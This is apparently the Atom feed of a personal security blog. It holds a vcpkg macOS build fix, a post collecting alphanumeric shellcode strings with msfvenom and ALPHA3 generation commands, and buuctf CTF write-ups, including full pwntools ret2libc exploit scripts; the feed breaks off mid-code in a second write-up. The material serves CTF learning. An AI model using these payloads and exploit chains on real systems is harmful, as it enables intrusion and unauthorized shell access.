<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ios&#39;s blog</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://iosmosis.github.io/"/>
  <updated>2020-05-05T04:18:15.164Z</updated>
  <id>http://iosmosis.github.io/</id>
  
  <author>
    <name>ios</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>vcpkg-MacOS10.15-安装问题</title>
    <link href="http://iosmosis.github.io/2020/05/05/vcpkg-MacOS10-15-%E5%AE%89%E8%A3%85%E9%97%AE%E9%A2%98/"/>
    <id>http://iosmosis.github.io/2020/05/05/vcpkg-MacOS10-15-安装问题/</id>
    <published>2020-05-05T04:15:25.000Z</published>
    <updated>2020-05-05T04:18:15.164Z</updated>
    
    <content type="html"><![CDATA[<h4 id="在安装vcpkg时遇到如下报错"><a href="#在安装vcpkg时遇到如下报错" class="headerlink" title="在安装vcpkg时遇到如下报错"></a>在安装vcpkg时遇到如下报错</h4><p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">6/75<span class="token punctuation">]</span> Building CXX object CMakeFiles/vcpkglib.dir/src/vcpkg/archives.cpp.o
FAILED: CMakeFiles/vcpkglib.dir/src/vcpkg/archives.cpp.o
/usr/local/bin/g++-9  -DVCPKG_DISABLE_METRICS<span class="token operator">=</span>0 -DVCPKG_USE_STD_FILESYSTEM<span class="token operator">=</span>1 -I<span class="token punctuation">..</span>/include -O3 -DNDEBUG -isysroot /Library/Developer/CommandLineTools/SDKs/MacOSX10.15.sdk   -std<span class="token operator">=</span>c++17 -MD -MT CMakeFiles/vcpkglib.dir/src/vcpkg/archives.cpp.o -MF CMakeFiles/vcpkglib.dir/src/vcpkg/archives.cpp.o.d -o CMakeFiles/vcpkglib.dir/src/vcpkg/archives.cpp.o -c <span class="token punctuation">..</span>/src/vcpkg/archives.cpp
In <span class="token function">file</span> included from /Library/Developer/CommandLineTools/SDKs/MacOSX10.15.sdk/usr/include/wchar.h:90,
                 from /usr/local/Cellar/gcc/9.1.0/include/c++/9.1.0/cwchar:44,
                 from /usr/local/Cellar/gcc/9.1.0/include/c++/9.1.0/bits/postypes.h:40,
                 from /usr/local/Cellar/gcc/9.1.0/include/c++/9.1.0/bits/char_traits.h:40,
                 from /usr/local/Cellar/gcc/9.1.0/include/c++/9.1.0/string:40,
                 from /usr/local/Cellar/gcc/9.1.0/include/c++/9.1.0/stdexcept:39,
                 from /usr/local/Cellar/gcc/9.1.0/include/c++/9.1.0/array:39,
                 from /usr/local/Cellar/gcc/9.1.0/include/c++/9.1.0/tuple:39,
                 from /usr/local/Cellar/gcc/9.1.0/include/c++/9.1.0/functional:54,
                 from /usr/local/Cellar/gcc/9.1.0/include/c++/9.1.0/pstl/glue_algorithm_defs.h:13,
                 from /usr/local/Cellar/gcc/9.1.0/include/c++/9.1.0/algorithm:71,
                 from <span class="token punctuation">..</span>/include/pch.h:22,
                 from <span class="token punctuation">..</span>/src/vcpkg/archives.cpp:1:
/usr/local/Cellar/gcc/9.1.0/lib/gcc/9/gcc/x86_64-apple-darwin18/9.1.0/include-fixed/stdio.h:222:7: error: conflicting declaration of <span class="token string">'char* ctermid(char*)'</span> with <span class="token string">'C'</span> linkage
  222 <span class="token operator">|</span> char *ctermid<span class="token punctuation">(</span>char *<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token operator">|</span>       ^~~~~~~
In <span class="token function">file</span> included from /Library/Developer/CommandLineTools/SDKs/MacOSX10.15.sdk/usr/include/unistd.h:525,
                 from <span class="token punctuation">..</span>/include/pch.h:19,
                 from <span class="token punctuation">..</span>/src/vcpkg/archives.cpp:1:
/Library/Developer/CommandLineTools/SDKs/MacOSX10.15.sdk/usr/include/_ctermid.h:26:10: note: previous declaration with <span class="token string">'C++'</span> linkage
   26 <span class="token operator">|</span> char    *ctermid<span class="token punctuation">(</span>char *<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token operator">|</span>          ^~~~~~~
ninja: build stopped: subcommand failed.
</code></pre>
<h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>./bootstrap-vcpkg.sh --allowAppleClang
</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;在安装vcpkg时遇到如下报错&quot;&gt;&lt;a href=&quot;#在安装vcpkg时遇到如下报错&quot; class=&quot;headerlink&quot; title=&quot;在安装vcpkg时遇到如下报错&quot;&gt;&lt;/a&gt;在安装vcpkg时遇到如下报错&lt;/h4&gt;&lt;p&gt;&lt;/p&gt;&lt;p class=&quot;code
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>shellcode</title>
    <link href="http://iosmosis.github.io/2020/03/29/shellcode/"/>
    <id>http://iosmosis.github.io/2020/03/29/shellcode/</id>
    <published>2020-03-29T12:14:01.000Z</published>
    <updated>2020-03-29T12:33:24.600Z</updated>
    
    <content type="html"><![CDATA[<h1 id="x64-shellcode"><a href="#x64-shellcode" class="headerlink" title="x64_shellcode"></a>x64_shellcode</h1><h3 id="已测试"><a href="#已测试" class="headerlink" title="已测试"></a>已测试</h3><p></p><p class="code-caption" data-lang="assembly" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-assembly"><code class="language-assembly">shellcode = "Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t"
</code></pre>
<h3 id="未测试"><a href="#未测试" class="headerlink" title="未测试"></a>未测试</h3><p></p><p class="code-caption" data-lang="assembly" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-assembly"><code class="language-assembly">shellcode = "PPYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXA"
</code></pre>
<h3 id="ALpha3-生成-纯数字字母命令"><a href="#ALpha3-生成-纯数字字母命令" class="headerlink" title="ALpha3 生成 纯数字字母命令"></a>ALpha3 生成 纯数字字母命令</h3><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
s<span class="token operator">=</span>open<span class="token punctuation">(</span><span class="token string">"sc.bin"</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span>
sh<span class="token operator">=</span>asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>write<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>
s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<pre class=" language-bash"><code class="language-bash">python ./ALPHA3.py x64 ascii mixedcase rax --input<span class="token operator">=</span><span class="token string">"sc.bin"</span> <span class="token operator">></span> out.bin
<span class="token operator">&lt;</span>p class<span class="token operator">=</span><span class="token string">"code-caption"</span> data-lang<span class="token operator">=</span><span class="token string">""</span> data-line_number<span class="token operator">=</span><span class="token string">"frontend"</span> data-trim_indent<span class="token operator">=</span><span class="token string">"backend"</span> data-label_position<span class="token operator">=</span><span class="token string">"outer"</span> data-labels_left<span class="token operator">=</span><span class="token string">""</span> data-labels_right<span class="token operator">=</span><span class="token string">""</span> data-labels_copy<span class="token operator">=</span><span class="token string">""</span><span class="token operator">></span><span class="token operator">&lt;</span>span class<span class="token operator">=</span><span class="token string">"code-caption-label"</span><span class="token operator">></span><span class="token operator">&lt;</span>/span<span class="token operator">></span><span class="token operator">&lt;</span>/p<span class="token operator">></span>
</code></pre>
<p>相关解读文章</p>
<p><a href="https://noonegroup.xyz/posts/8002891b/" target="_blank" rel="noopener">NoOne</a></p>
<p><a href="https://www.jianshu.com/p/8ae8c055e35c" target="_blank" rel="noopener">使用alpha3生成alphanumeric shellcode</a></p>
<p><a href="https://hama.hatenadiary.jp/entry/2017/04/04/190129" target="_blank" rel="noopener"><a href="https://hama.hatenadiary.jp/entry/2017/04/04/190129" target="_blank" rel="noopener">x64 alphanumeric shellcodeを書く</a></a></p>
<h1 id="x86-shellcode"><a href="#x86-shellcode" class="headerlink" title="x86_shellcode"></a>x86_shellcode</h1><h3 id="未测试-1"><a href="#未测试-1" class="headerlink" title="未测试"></a>未测试</h3><pre class=" language-asm"><code class="language-asm">shellcode = "PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIBJTK0XZ9V2U62HFMBCMYJGRHFORSE8EP2HFO3R3YBNLIJC1BZHDHS05PS06ORB2IRNFOT3RH30PWF3MYKQXMK0AA"
</code></pre>
<h3 id="msf生成命令"><a href="#msf生成命令" class="headerlink" title="msf生成命令"></a>msf生成命令</h3><p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">msfvenom -a x86 --platform linux -p linux/x86/exec CMD<span class="token operator">=</span><span class="token string">"/bin/sh"</span> -e x86/alpha_upper BufferRegister<span class="token operator">=</span>eax
</code></pre>
<p>相关解读</p>
<p><a href="https://xz.aliyun.com/t/6645" target="_blank" rel="noopener">shellcode 的艺术</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;x64-shellcode&quot;&gt;&lt;a href=&quot;#x64-shellcode&quot; class=&quot;headerlink&quot; title=&quot;x64_shellcode&quot;&gt;&lt;/a&gt;x64_shellcode&lt;/h1&gt;&lt;h3 id=&quot;已测试&quot;&gt;&lt;a href=&quot;#已测试&quot; c
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>buuctf-Writeup</title>
    <link href="http://iosmosis.github.io/2020/02/23/buuctf-Writeup/"/>
    <id>http://iosmosis.github.io/2020/02/23/buuctf-Writeup/</id>
    <published>2020-02-23T08:41:30.000Z</published>
    <updated>2020-04-23T12:49:25.943Z</updated>
    
    <content type="html"><![CDATA[<h1 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h1><h4 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h4><p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~/APwn/buuctf$ checksec ogeek-babyrop
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ios/APwn/buuctf/ogeek-babyrop'</span>
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>
</code></pre>
<p>简单运行程序测试后查看ida</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4h] [ebp-14h]</span>
  <span class="token keyword">char</span> v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Bh] [ebp-Dh]</span>
  <span class="token keyword">int</span> fd<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-Ch]</span>

  <span class="token function">sub_80486BB</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/urandom"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> fd <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">)</span>
    <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v2 <span class="token operator">=</span> <span class="token function">sub_804871F</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sub_80487D0</span><span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>读取一个随机数 4 size</p>
<p>执行sub_804871F 返回到v2</p>
<p>执行sub_80487D0(v2)</p>
<p>跟进 sub_804871F</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">sub_804871F</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  size_t v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>
  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-4Ch]</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+2Ch] [ebp-2Ch]</span>
  <span class="token keyword">unsigned</span> __int8 v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+33h] [ebp-25h]</span>
  ssize_t v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4Ch] [ebp-Ch]</span>

  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x20u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x20u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token string">"%ld"</span><span class="token punctuation">,</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v6 <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x20u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  buf<span class="token punctuation">[</span>v6 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  v1 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strncmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">,</span> v1<span class="token punctuation">)</span> <span class="token punctuation">)</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"Correct\n"</span><span class="token punctuation">,</span> <span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> v5<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>首先看v6=用户输入参数</p>
<p>v1=buf的长度</p>
<p>进行str 字符串比较如果不相等就exit</p>
<p>因为strlen遇到\x00会终止</p>
<p>如果将\x00为字符串首位 则strlen的结果为0</p>
<p>所以strncmp(buf, &amp;s, v1)就只会对比长度0位 </p>
<p>从而达到绕过</p>
<p>这里要注意会返回一个值v5 而v5为接下来需要的read的size</p>
<p>可以看到 buf+7=v5</p>
<p>我们只需要构造\x00+任意6size的字符+长度 即可</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c">ssize_t __cdecl <span class="token function">sub_80487D0</span><span class="token punctuation">(</span><span class="token keyword">char</span> a1<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  ssize_t result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+11h] [ebp-E7h]</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span> a1 <span class="token operator">==</span> <span class="token number">127</span> <span class="token punctuation">)</span>
    result <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">0xC8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">else</span>
    result <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>看到 a1可以控制长度 而a1为return的 v5</p>
<p>且整个程序没用到puts函数 而是用到了write</p>
<p>所以 leak是要使用write函数偏移且重新载入main函数</p>
<h3 id="leak-addr"><a href="#leak-addr" class="headerlink" title="leak addr"></a>leak addr</h3><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./ogeek-babyrop'</span><span class="token punctuation">)</span>
elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'ogeek-babyrop'</span><span class="token punctuation">)</span>
libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'/lib/i386-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>
write_got<span class="token operator">=</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
write_plt<span class="token operator">=</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"\x00"</span><span class="token operator">+</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span><span class="token string">"\xff"</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Correct\n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 这里有坑 注意\n</span>
leak <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0xe7</span><span class="token operator">+</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>write_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x8048825</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#构造leak回环</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>leak<span class="token punctuation">)</span>
write<span class="token operator">=</span>u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>write<span class="token punctuation">)</span>
</code></pre>
<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>getshell就比较容易了</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./ogeek-babyrop'</span><span class="token punctuation">)</span>
elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'ogeek-babyrop'</span><span class="token punctuation">)</span>
libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'/lib/i386-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>
write_got<span class="token operator">=</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
write_plt<span class="token operator">=</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"\x00"</span><span class="token operator">+</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span><span class="token string">"\xff"</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Correct\n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># /</span>
leak <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0xe7</span><span class="token operator">+</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>write_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x8048825</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>leak<span class="token punctuation">)</span>
write<span class="token operator">=</span>u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>write<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"\x00"</span><span class="token operator">+</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span><span class="token string">"\xff"</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Correct\n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># /</span>
system<span class="token operator">=</span>write<span class="token operator">-</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
binsh<span class="token operator">=</span>write<span class="token operator">-</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span><span class="token operator">+</span>next<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
payload1<span class="token operator">=</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0xe7</span><span class="token operator">+</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x1553155</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<h1 id="get-started-3dsctf-2016-Pwn"><a href="#get-started-3dsctf-2016-Pwn" class="headerlink" title="get_started_3dsctf_2016-Pwn"></a>get_started_3dsctf_2016-Pwn</h1><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4h] [ebp-38h]</span>

  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Qual a palavrinha magica? "</span><span class="token punctuation">,</span> v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>明显的栈溢出</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> __cdecl <span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>
  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// esi</span>
  <span class="token keyword">unsigned</span> __int8 v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// al</span>
  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ecx</span>
  <span class="token keyword">unsigned</span> __int8 v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// al</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span> a1 <span class="token operator">==</span> <span class="token number">0x308CD64F</span> <span class="token operator">&amp;&amp;</span> a2 <span class="token operator">==</span> <span class="token number">0x195719D1</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    v2 <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span> <span class="token string">"rt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    v3 <span class="token operator">=</span> v2<span class="token punctuation">;</span>
